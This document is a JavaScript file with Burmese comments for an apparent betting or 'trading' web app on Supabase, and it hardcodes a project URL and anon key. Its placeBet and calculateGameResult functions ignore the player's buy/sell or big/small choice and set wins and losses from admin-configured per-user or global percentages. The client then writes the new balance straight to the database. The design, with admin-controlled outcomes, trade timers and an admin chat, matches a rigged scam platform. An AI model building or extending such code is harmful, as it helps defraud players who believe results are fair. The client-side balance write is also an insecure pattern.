// assets/js/core.js

// ၁။ Supabase ချိတ်ဆက်မှု (New Project Credentials)
const supabaseUrl = 'https://qonmwtjznyrfenikqffk.supabase.co';
const supabaseKey = 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6InFvbm13dGp6bnlyZmVuaWtxZmZrIiwicm9sZSI6ImFub24iLCJpYXQiOjE3NzA3NDQ3NzEsImV4cCI6MjA4NjMyMDc3MX0.OgTzG55xr_zkK8pIRp_S4lPG4eTIHunqz5PP_EPEFrs';

const db = supabase.createClient(supabaseUrl, supabaseKey);

console.log("✅ New Connection Established via core.js");

// ၂။ Helper Functions (Login စစ်ဆေးရန်)
async function checkAccess() {
    const { data: { session } } = await db.auth.getSession();
    if (!session) {
        // Login မဝင်ရသေးရင် Login စာမျက်နှာကို မောင်းထုတ်မယ်
        window.location.href = 'blog-grid.html';
    }
}

/* ==================================================================
   ADMIN CONTROL CONNECTIVITY (Add this to the bottom of core.js)
   ================================================================== */

let myGameUID = null; // 6-digit UID (Admin သုံးမယ့် UID)
let myUUID = null;    // Supabase User ID

// ၁။ Login ဝင်ပြီးတာနဲ့ UID ကိုဆွဲထုတ်ပြီး System စမယ်
async function initUserSystem() {
    const { data: { session } } = await db.auth.getSession();
    if (!session) return; // Login မဝင်ရသေးရင် ဘာမှမလုပ်ဘူး

    myUUID = session.user.id;

    // Profiles table ထဲကနေ 6-digit UID ကို လှမ်းယူမယ်
    const { data: profile } = await db.from('profiles').select('uid').eq('id', myUUID).single();
    
    if (profile) {
        myGameUID = profile.uid;
        console.log("Active Game UID:", myGameUID);
        
        // UID ရပြီဆိုတာနဲ့ Admin နဲ့ချိတ်မယ့် Listener တွေ စဖွင့်မယ်
        initRealtimeBalance(); 
        initChatSystem();
    }
}

// Page Load ဖြစ်တာနဲ့ ဒါကို စ run မယ်
initUserSystem();


// ၂။ Realtime Balance (Admin ငွေဖြည့်ရင် ချက်ချင်းတက်မယ်)
async function initRealtimeBalance() {
    // (A) လက်ရှိပိုက်ဆံကို အရင်ပြမယ်
    fetchBalance();

    // (B) Admin ပြောင်းလဲမှုကို နားထောင်မယ်
    db.channel('public:assets')
        .on('postgres_changes', 
            { event: 'UPDATE', schema: 'public', table: 'assets', filter: `uid=eq.${myGameUID}` }, 
            (payload) => {
                if(payload.new) {
                    updateBalanceUI(payload.new.amount);
                }
            }
        ).subscribe();
}

// Helper: ပိုက်ဆံဆွဲထုတ်ခြင်း
async function fetchBalance() {
    const { data } = await db.from('assets').select('amount').eq('uid', myGameUID).single();
    if (data) updateBalanceUI(data.amount);
}

// Helper: UI မှာ ပိုက်ဆံပြခြင်း
function updateBalanceUI(amount) {
    // HTML မှာ <span id="user-balance">...</span> ရှိရမယ်
    const el = document.getElementById('user-balance'); 
    if (el) el.innerText = Number(amount).toLocaleString();
}


// ၃။ Trading Logic (Admin နိုင်/ရှုံး ထိန်းချုပ်မှု)
// HTML ခလုတ်မှာ သုံးရန်: onclick="placeBet(100, 'big')"
window.placeBet = async function(betAmount, choice) {
    if (!myGameUID) return alert("Loading User Data...");

    // (A) ပိုက်ဆံလောက်လား စစ်မယ်
    const { data: asset } = await db.from('assets').select('*').eq('uid', myGameUID).single();
    const currentBal = Number(asset?.amount ?? 0);

    if (currentBal < betAmount) return alert("လက်ကျန်ငွေ မလုံလောက်ပါ");

    // (B) Admin Control (Win/Lose) ကို လှမ်းစစ်မယ်
    const { data: controls } = await db.from('game_control').select('*')
        .or(`target_uid.eq.GLOBAL,target_uid.eq.${myGameUID}`);

    // (C) နိုင်/ရှုံး တွက်မယ်
    let result = calculateGameResult(controls); // 'win' or 'lose'

    // (D) ပိုက်ဆံ အတိုး/အလျော့ လုပ်မယ်
    let newBal = result === 'win' ? (currentBal + betAmount) : (currentBal - betAmount);

    // (E) Database Update (Assets)
    await db.from('assets').update({ amount: newBal }).eq('uid', myGameUID);

    // (F) History မှတ်တမ်း (Optional)
    // await db.from('balance_history').insert([...]) // Table ရှိမှထည့်ပါ

    alert(`Result: ${result.toUpperCase()}! New Balance: ${newBal}`);
};

// နိုင်/ရှုံး တွက်သည့် ဖော်မြူလာ
function calculateGameResult(controls) {
    // ၁. ကိုယ့်အတွက် သီးသန့်ပေးထားတာ ရှိလား (Personal)
    const personal = controls.find(c => c.target_uid === myGameUID && c.is_active);
    // ၂. မရှိရင် Global ကို ကြည့်မယ်
    const global = controls.find(c => c.target_uid === 'GLOBAL' && c.is_active);

    const activeRule = personal || global;

    // Rule မရှိရင် 50/50 Random
    if (!activeRule) return Math.random() > 0.5 ? 'win' : 'lose';

    // Rule ရှိရင် Admin ပေးတဲ့ % အတိုင်းတွက်မယ်
    const chance = Math.random() * 100;
    if (activeRule.mode === 'win') {
        return chance <= activeRule.percentage ? 'win' : 'lose';
    } else {
        return chance <= activeRule.percentage ? 'lose' : 'win';
    }
}


// ၄။ Chat System (Admin နဲ့ စာပြောရန်)
async function initChatSystem() {
    const chatBox = document.getElementById('chat-messages-container'); // HTML ID
    if (!chatBox) return;

    // (A) စာအဟောင်းတွေ ဆွဲပြမယ်
    const { data } = await db.from('messages').select('*')
        .eq('uid', myGameUID).order('created_at', { ascending: true });
    
    if (data) {
        chatBox.innerHTML = '';
        data.forEach(msg => appendMessageUI(msg.content, msg.is_admin));
    }

    // (B) Admin ပြန်စာကို နားထောင်မယ်
    db.channel('chat_listener')
        .on('postgres_changes', 
            { event: 'INSERT', schema: 'public', table: 'messages', filter: `uid=eq.${myGameUID}` }, 
            (payload) => {
                appendMessageUI(payload.new.content, payload.new.is_admin);
            }
        ).subscribe();
}

/* ====================================
   CHAT UI HANDLERS
   ==================================== */

// ၁။ Send ခလုတ်နှိပ်ရင် အလုပ်လုပ်မည့် Function
window.sendMessage = async function() {
    const input = document.getElementById('chat-input');
    const text = input.value.trim();
    if (!text) return;

    // Database ထဲထည့်မယ် (uid က 6-digit UID ဖြစ်ရမယ်)
    // (မှတ်ချက်: myGameUID က login ဝင်ထားမှ ရမယ်)
    if (!myGameUID) return alert("Connecting...");

    await db.from('messages').insert([{
        uid: myGameUID, 
        content: text,
        is_admin: false,
        type: 'text'
    }]);

    input.value = ''; // ရိုက်ပြီးရင် စာရှင်းမယ်
};


// ၂။ Plus (+) ခလုတ်နှိပ်ရင် အလုပ်လုပ်မည့် Function
window.handleAttachment = function() {
    // လောလောဆယ် Alert ပြမယ် (နောက်ပိုင်း Image Upload ထည့်မယ်)
    alert("Attachment feature coming soon!"); 
    
    // အကယ်၍ ပုံတင်တာ လုပ်ချင်ရင် ဒီနေရာမှာ File Input ဖွင့်တဲ့ ကုဒ်ရေးရမယ်
};

// ၃။ Enter ခေါက်ရင် စာပို့အောင် လုပ်မယ် (Optional)
document.getElementById('chat-input')?.addEventListener('keypress', function (e) {
    if (e.key === 'Enter') {
        sendMessage();
    }
});

// UI ပေါ် စာပြရန်
function appendMessageUI(text, isAdmin) {
    const chatBox = document.getElementById('chat-messages-container');
    if (!chatBox) return;

    const div = document.createElement('div');
    // CSS Class လေးတွေ ခွဲပေးထားရင် ဘယ်/ညာ ကပ်လို့ရပါတယ်
    div.className = isAdmin ? 'msg-admin' : 'msg-user'; 
    div.innerText = text;
    chatBox.appendChild(div);
    chatBox.scrollTop = chatBox.scrollHeight;
}



/* ====================================
   UI HANDLERS (For Trade Page)
   ==================================== */

let selectedSeconds = 120; // Default အချိန်

// (A) အချိန်ရွေးတဲ့ Function (အရောင်ပြောင်းတာပါ ပါမယ်)
function selectTime(seconds, btn) {
    selectedSeconds = seconds;
    console.log("Time Selected:", selectedSeconds);

    // ခလုတ်အကုန်လုံးကို အရောင်ပြန်ဖျောက် (Reset styles)
    const allBtns = document.querySelectorAll('.time-btn');
    allBtns.forEach(b => {
        b.style.background = 'transparent';
        b.style.border = '1px solid rgba(255,255,255,0.15)';
        b.style.color = '#ccc';
        b.classList.remove('active');
    });

    // နှိပ်လိုက်တဲ့ ခလုတ်ကို အရောင်ခြယ် (Active style)
    btn.style.background = '#005ED3';
    btn.style.border = '1px solid #005ED3';
    btn.style.color = '#fff';
    btn.classList.add('active');
}

// (B) Buy/Sell နှိပ်ရင် အလုပ်လုပ်မည့် Function
async function handleTradeClick(choice) {
    // Input ထဲက ပိုက်ဆံပမာဏကို လှမ်းယူမယ်
    const amountInput = document.getElementById('bet-amount');
    
    // Input မရှိရင် Default 100 နဲ့ သွားမယ်
    const amount = amountInput ? Number(amountInput.value) : 100;

    if (amount <= 0) {
        alert("Please enter a valid amount!");
        return;
    }

    // မူရင်း placeBet function ကို လှမ်းခေါ်မယ်
    // (မှတ်ချက်: placeBet function က core.js အပေါ်ပိုင်းမှာ ရှိပြီးသားဖြစ်ရမယ်)
    await placeBet(amount, choice); 
}